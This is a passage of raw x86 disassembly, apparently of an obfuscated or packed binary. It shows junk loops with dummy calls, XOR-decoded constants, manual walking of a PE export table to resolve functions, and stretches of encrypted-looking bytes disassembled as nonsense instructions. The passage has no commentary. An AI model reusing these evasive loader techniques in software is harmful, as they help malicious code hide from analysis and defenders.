  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    ecx,edx
  40d123:	sub    ah,ch
  40d125:	loop   0x40d120
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	shl    BYTE PTR [ebx+0x55],1
  40d131:	jle    0x40d0ee
  40d133:	(bad)  
  40d134:	int    0xd
  40d136:	sub    al,0x27
  40d138:	and    bl,BYTE PTR [esi]
  40d13a:	aaa    
  40d13b:	mov    sp,0xdc48
  40d13f:	dec    edi
  40d140:	dec    edx
  40d141:	pop    ecx
  40d142:	xlat   BYTE PTR ds:[ebx]
  40d143:	mov    DWORD PTR [edi],eax
  40d145:	pop    eax
  40d146:	jmp    0x40d112
  40d148:	pop    edx
  40d149:	addr16 sub eax,0x78e74b7d
  40d14f:	loop   0x40d116
  40d151:	fcmovu st,st(7)
  40d153:	lods   eax,DWORD PTR ds:[esi]
  40d154:	cdq    
  40d155:	(bad)  
  40d157:	out    dx,eax
  40d158:	sbb    BYTE PTR [esi+edx*4],ch
  40d15b:	xchg   edx,eax
  40d15c:	adc    esp,DWORD PTR [eax-0x757fd81a]
  40d162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d163:	imul   esp,DWORD PTR [esi+0x68],0xf25a6fcd
  40d16a:	dec    eax
  40d16b:	(bad)  
  40d16c:	mov    ah,0x4f
  40d16e:	pop    ebp
  40d16f:	cld    
  40d170:	fwait
  40d171:	lahf   
  40d172:	adc    DWORD PTR [edi-0x4e435f2d],0x7fc0464e
  40d17c:	div    BYTE PTR ds:0xac1f1324
  40d182:	sub    DWORD PTR [esi],edi
  40d184:	fs xor al,0x4b
  40d187:	sti    
  40d188:	test   al,0xb9
  40d18a:	mov    ecx,0xe78cdfd7
  40d18f:	test   al,0x35
  40d191:	ss dec edi
  40d193:	push   ss
  40d194:	push   ss
  40d195:	add    edi,DWORD PTR [ebx-0x4e3ca872]
  40d19b:	cmovae ecx,DWORD PTR [ecx]
  40d19e:	inc    ax
  40d1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1a1:	iret   
  40d1a2:	xchg   esp,eax
  40d1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a4:	cmp    bl,BYTE PTR ds:0x1bc0dd5
  40d1aa:	out    dx,al
  40d1ab:	imul   eax,DWORD PTR [edx],0xffffff9f
  40d1ae:	ret    
  40d1af:	xor    ebp,ecx
  40d1b1:	aas    
  40d1b2:	mov    cl,0x5a
  40d1b4:	push   edx
  40d1b5:	cmc    
  40d1b6:	jge    0x40d191
  40d1b8:	mov    dh,0x53
  40d1ba:	xchg   edi,eax
  40d1bb:	pusha  
  40d1bc:	je     0x40d1bb
  40d1be:	out    0xf9,eax
  40d1c0:	xor    DWORD PTR [ebx-0x58acb14c],0xe8099852
  40d1ca:	jnp    0x40d18b
  40d1cc:	mov    ebp,0x79b2b65c
  40d1d1:	cmp    DWORD PTR [eax+0xd],esi
  40d1d4:	mov    dl,0x3b
  40d1d6:	test   DWORD PTR ds:0x46aedfd4,0x1be1e6e7
  40d1e0:	xchg   ebp,eax
  40d1e1:	pop    ebp
  40d1e2:	mov    eax,ds:0x13732bd0
  40d1e7:	xor    DWORD PTR [ecx],ecx
  40d1e9:	pop    ds
  40d1ea:	add    BYTE PTR [edi+eax*4-0x33d8d1bd],al
  40d1f1:	fwait
  40d1f2:	shl    DWORD PTR [esi-0x44bf5985],0x1c
  40d1f9:	mov    dh,0xec
  40d1fb:	stc    
  40d1fc:	mov    ebx,0xd3dfb34a
  40d201:	mov    dh,BYTE PTR [edi-0x126bd0a9]
  40d207:	dec    edx
  40d208:	lods   eax,DWORD PTR ds:[esi]
  40d209:	mov    ah,0x54
  40d20b:	jne    0x40d1b7
  40d20d:	scas   al,BYTE PTR es:[edi]
  40d20e:	aas    
  40d20f:	fistp  WORD PTR [ebp-0x63ed37fa]
  40d215:	stc    
  40d216:	ins    DWORD PTR es:[edi],dx
  40d217:	scas   eax,DWORD PTR es:[edi]
  40d218:	shl    ah,1
  40d21a:	adc    eax,0x1fe226a5
  40d21f:	sub    BYTE PTR [edx],ch
  40d221:	push   cs
  40d222:	loopne 0x40d265
  40d224:	push   eax
  40d225:	dec    ebp
  40d226:	rcr    BYTE PTR [esi],1
  40d228:	sub    DWORD PTR [edx+edx*1],ebx
  40d22b:	popa   
  40d22c:	push   0x2efa1292
  40d231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d232:	lahf   
  40d233:	ins    BYTE PTR es:[edi],dx
  40d234:	mov    esi,0x75d8fde8
  40d239:	fs dec esp
  40d23b:	add    bl,al
  40d23d:	ins    DWORD PTR es:[edi],dx
  40d23e:	mov    eax,ds:0x95a3bfb0
  40d243:	cmovns esi,DWORD PTR [edx-0x1a]
  40d247:	xor    BYTE PTR ds:0xfc81246a,al
  40d24d:	cmp    dh,0x21
  40d250:	call   0x1a59:0x70130bcf
  40d257:	(bad)  
  40d258:	xor    esi,ebp
  40d25a:	add    ecx,ebx
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x1b6a8e30
  40d410:	jne    0x40d41f
  40d412:	in     eax,dx
  40d413:	lods   eax,DWORD PTR ds:[esi]
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3a2
  40d41c:	jnp    0x40d3df
  40d41e:	pop    es
  40d41f:	and    dl,BYTE PTR [eax+edi*4]
  40d422:	cmc    
  40d423:	cmp    ecx,esi
  40d425:	cmp    DWORD PTR [edx-0x5396807a],0x93cbf6f9
  40d42f:	mov    BYTE PTR [esp+ebp*4-0x6f],dl
  40d433:	dec    ecx
  40d434:	call   0xefd231ab
  40d439:	or     al,0x69
  40d43b:	(bad)  
  40d43c:	and    edi,ebx
  40d43e:	test   eax,0x5dfe707
  40d443:	into   
  40d444:	mov    ds,esp
  40d446:	popa   
  40d447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d448:	push   esi
  40d449:	jnp    0x40d3ce
  40d44b:	or     DWORD PTR [edx],eax
  40d44d:	sub    eax,0xa1dbb8e2
  40d452:	and    al,0x68
  40d454:	aad    0x17
  40d456:	adc    dh,BYTE PTR [edx]
  40d458:	call   0x47b0474d
  40d45d:	pop    eax
  40d45e:	fwait
  40d45f:	mov    BYTE PTR [eax-0x728d370b],bl
  40d465:	add    al,0xd2
  40d467:	imul   eax,DWORD PTR ds:0x2749eff8,0xffffffe8
  40d46e:	mov    bh,0x3a
  40d470:	je     0x40d44a
  40d472:	adc    eax,DWORD PTR [eax+0x13]
  40d475:	ins    DWORD PTR es:[edi],dx
  40d476:	jecxz  0x40d4a4
  40d478:	push   cs
  40d479:	dec    esp
  40d47a:	bound  ebx,QWORD PTR [edx*2-0x51b21de3]
  40d481:	add    al,0x2d
  40d483:	xor    eax,0x3c2cdda2
  40d488:	add    al,0x88
  40d48a:	cwde   
  40d48b:	add    edi,eax
  40d48d:	adc    bh,BYTE PTR [edi-0x49]
  40d490:	nop
  40d491:	adc    eax,0xad3160ca
  40d496:	or     BYTE PTR [ebp+0x64],ch
  40d499:	add    cl,BYTE PTR [esi+ecx*4]
  40d49c:	test   eax,0x538a0c94
  40d4a1:	lods   al,BYTE PTR ds:[esi]
  40d4a2:	inc    esp
  40d4a3:	mov    esi,0xc77fc330
  40d4a8:	pop    ds
  40d4a9:	mov    esp,0x8246e242
  40d4ae:	xchg   ecx,eax
  40d4af:	dec    ecx
  40d4b0:	enter  0xd596,0x94
  40d4b4:	(bad)  
  40d4b5:	rol    BYTE PTR [ebx+0x53],1
  40d4b8:	pop    edx
  40d4b9:	jg     0x40d45a
  40d4bb:	mov    ecx,0xe2148033
  40d4c0:	stc    
  40d4c1:	jmp    0x55079487
  40d4c6:	les    eax,FWORD PTR [edx]
  40d4c8:	adc    DWORD PTR [ebx+0x76],0xffffff90
  40d4cc:	ins    BYTE PTR es:[edi],dx
  40d4cd:	nop
  40d4ce:	mov    edi,es
  40d4d0:	fdiv   QWORD PTR [edi+0x63f2178d]
  40d4d6:	rcr    DWORD PTR [edi],1
  40d4d8:	mov    cl,0x2d
  40d4da:	or     al,0xa
  40d4dc:	(bad)  
  40d4dd:	push   0xfffffff9
  40d4df:	xchg   ebp,eax
  40d4e0:	cmp    eax,0xa27a9714
  40d4e5:	or     eax,0x3d2be6bb
  40d4ea:	sbb    BYTE PTR es:[edx],al
  40d4ed:	out    0xd3,eax
  40d4ef:	sbb    ecx,DWORD PTR [ebp-0x55]
  40d4f2:	mov    ch,0x29
  40d4f4:	inc    ecx
  40d4f5:	fdiv   QWORD PTR [esi]
  40d4f7:	sub    BYTE PTR [esi],al
  40d4f9:	push   edi
  40d4fa:	cmp    eax,0x7e91cc27
  40d4ff:	cli    
  40d500:	add    BYTE PTR [edi],bh
  40d502:	dec    ebp
  40d503:	pop    ebp
  40d504:	push   edi
  40d505:	xchg   edi,eax
  40d506:	adc    DWORD PTR [esi],eax
  40d508:	sub    DWORD PTR [ebp+0x3],eax
  40d50b:	push   es
  40d50c:	mov    WORD PTR [eax-0x6d],fs
  40d50f:	sbb    DWORD PTR [ebx+0x19],esp
  40d512:	pop    es
  40d513:	(bad)  
  40d514:	sub    ecx,DWORD PTR [esi-0x18]
  40d517:	xchg   edi,eax
  40d518:	xchg   ecx,eax
  40d519:	repnz mov ds:0x827c61ba,al
  40d51f:	xchg   edi,eax
  40d520:	not    DWORD PTR [ebp+0x542771e]
  40d526:	mov    edi,0xa8df2c9c
  40d52b:	repz mov al,0x1e
  40d52e:	add    al,0xc8
  40d530:	into   
  40d531:	xchg   ebp,eax
  40d532:	popa   
  40d533:	retf   0xa832
  40d536:	push   ebp
  40d537:	adc    esi,DWORD PTR [eax]
  40d539:	jae    0x40d508
  40d53b:	sbb    cl,0x4
  40d53e:	fisttp DWORD PTR [ebx+0x2012ad91]
  40d544:	xchg   dh,ah
  40d546:	call   0xe84d4b4a
  40d54b:	sbb    DWORD PTR [ecx-0x1],ebx
  40d54e:	dec    DWORD PTR [ebx+0x4d8bfc45]
  40d554:	clc    
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	ror    BYTE PTR [eax-0x70ae8903],cl
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d5fb
  40d5c4:	sahf   
  40d5c5:	call   0xbf9c8c6b
  40d5ca:	pop    esi
